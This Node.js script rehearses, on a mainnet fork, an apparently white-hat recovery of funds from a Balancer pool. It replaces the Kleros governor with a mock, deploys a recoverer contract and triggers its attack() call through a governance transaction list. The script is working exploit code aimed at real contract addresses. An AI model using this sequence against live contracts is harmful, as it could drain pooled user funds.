#!/usr/bin/env node

/* This script is used to test the attack on a fork of mainnet
 * In particular:
 *  - "0x334F12AfB7D8740868bE04719639616533075234" must be unlocked
 *  - "0x334F12AfB7D8740868bE04719639616533075234" must still be KlerosLiquid's governor
 *  - It deploys a mock governor exposing the same interface as KlerosGovernor
 *    but without governance capabilities
 */

const assert = require("assert")
const fs = require("fs")
const Web3 = require("web3")
const web3 = new Web3("http://54.176.51.52:8546")

const pnk = JSON.parse(fs.readFileSync("./build/contracts/xMiniMeToken.json"))
const weth = { address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2" }
const pool = { address: "0xC81d50c17754B379F1088574CF723Be4fb00307D" }
const klerosLiquid = JSON.parse(fs.readFileSync("./build/contracts/xKlerosLiquid.json"))
const governor = JSON.parse(fs.readFileSync("./build/contracts/xMockGovernor.json"))
const recoverer = JSON.parse(fs.readFileSync("./build/contracts/BalancerPoolRecoverer.json"))

pnk.address = "0x93ED3FBe21207Ec2E8f2d3c3de6e058Cb73Bc04d"

const PNK = new web3.eth.Contract(pnk.abi, pnk.address)

let transaction
;(async () => {
  klerosLiquid.address = await PNK.methods.controller().call()
  assert.equal(klerosLiquid.address, "0x988b3A538b618C7A603e1c11Ab82Cd16dbE28069")
  const KlerosLiquid = new web3.eth.Contract(klerosLiquid.abi, klerosLiquid.address)

  // Get a funded account
  let attacker
  const accounts = await web3.eth.getAccounts()
  for (let account of accounts) {
    const balance = BigInt(await web3.eth.getBalance(account))
    if (balance > 10n ** 18n) {
      // Account must be funded with at least 1 ETH
      attacker = account
      console.log(
        `Using account ${attacker} (${web3.utils.fromWei(balance.toString(), "ether")} ETH)`
      )
      break
    }
  }

  // Check KlerosLiquid's governor
  const originalGovernor = await KlerosLiquid.methods.governor().call()
  assert.equal(originalGovernor, "0x334F12AfB7D8740868bE04719639616533075234")

  // Deploy MockGovernor
  const GovernorFactory = new web3.eth.Contract(governor.abi)
  console.log("Deploying mock governor...")
  const Governor = await GovernorFactory.deploy({ data: governor.bytecode }).send({
    from: attacker,
    gasPrice: 20000000000,
    gas: 4000000
  })
  governor.address = Governor.options.address
  console.log(`Governor is at ${governor.address}`)

  // Change PNK's controller to the governor
  console.log("Changing governor...")
  transaction = await KlerosLiquid.methods.changeGovernor(governor.address).send({
    from: originalGovernor,
    gasPrice: 20000000000,
    gas: 4000000
  })
  console.log(transaction.transactionHash)
  assert(transaction.status)

  // Deploy Recoverer
  const RecovererFactory = new web3.eth.Contract(recoverer.abi)
  console.log("Deploying recoverer...")
  const Recoverer = await RecovererFactory.deploy({
    data: recoverer.bytecode,
    arguments: [
      governor.address, // Should be KlerosGovernor
      pnk.address,
      weth.address,
      pool.address,
      klerosLiquid.address,
      "0x67a57535b11445506a9e340662CD0c9755E5b1b4"
    ]
  }).send({
    from: attacker,
    gasPrice: 20000000000,
    gas: 4000000
  })
  recoverer.address = Recoverer.options.address
  console.log(`Recoverer is at ${recoverer.address}`)

  // Build transactions
  const transferRightsIntermediateData = PNK.methods.changeController(recoverer.address).encodeABI()

  const txs = {
    transferRights: {
      target: klerosLiquid.address,
      value: 0,
      data: KlerosLiquid.methods
        .executeGovernorProposal(pnk.address, 0, transferRightsIntermediateData)
        .encodeABI(),
      hash: undefined
    },
    attack: {
      target: recoverer.address,
      value: 0,
      data: Recoverer.methods.attack().encodeABI(),
      hash: undefined
    }
  }
  for (const step of Object.keys(txs)) {
    // Compute transaction hash
    const tx = txs[step]
    tx.hash = web3.utils.keccak256(
      tx.target + web3.utils.toHex(tx.value).slice(2).padStart(0x40, "0") + tx.data.slice(2)
    )
  }

  // Trigger attack
  console.log("=== ATTACK ===")
  if (BigInt(txs.transferRights.hash) < BigInt(txs.attack.hash)) {
    console.log("Submit list (case 1)")
    transaction = await Governor.methods
      .submitList(
        [txs.transferRights.target, txs.attack.target],
        [txs.transferRights.value, txs.attack.value],
        txs.transferRights.data + txs.attack.data.slice(2),
        [txs.transferRights.data.length / 2 - 1, txs.attack.data.length / 2 - 1],
        "Recover BPool's funds"
      )
      .send({
        from: attacker,
        gasPrice: 20000000000,
        gas: 4000000
      })
    console.log(transaction)
    assert(transaction.status)

    console.log("Trigger")
    await Governor.methods.executeTransactionList(0, 0, 2).send({
      from: attacker,
      gasPrice: 20000000000,
      gas: 4000000
    })
    console.log(transaction)
    assert(transaction.status)
  } else {
    console.log("Submit list (case 2)")
    transaction = await Governor.methods
      .submitList(
        [txs.attack.target, txs.transferRights.target],
        [txs.attack.value, txs.transferRights.value],
        txs.attack.data + txs.transferRights.data.slice(2),
        [txs.attack.data.length / 2 - 1, txs.transferRights.data.length / 2 - 1],
        "Recover BPool's funds"
      )
      .send({
        from: attacker,
        gasPrice: 20000000000,
        gas: 4000000
      })
    console.log(transaction)
    assert(transaction.status)

    console.log("Trigger 1")
    await Governor.methods.executeTransactionList(0, 1, 1).send({
      from: attacker,
      gasPrice: 20000000000,
      gas: 4000000
    })
    console.log(transaction)
    assert(transaction.status)
    console.log("Trigger 2")
    await Governor.methods.executeTransactionList(0, 0, 1).send({
      from: attacker,
      gasPrice: 20000000000,
      gas: 4000000
    })
    console.log(transaction)
    assert(transaction.status)
  }
})()
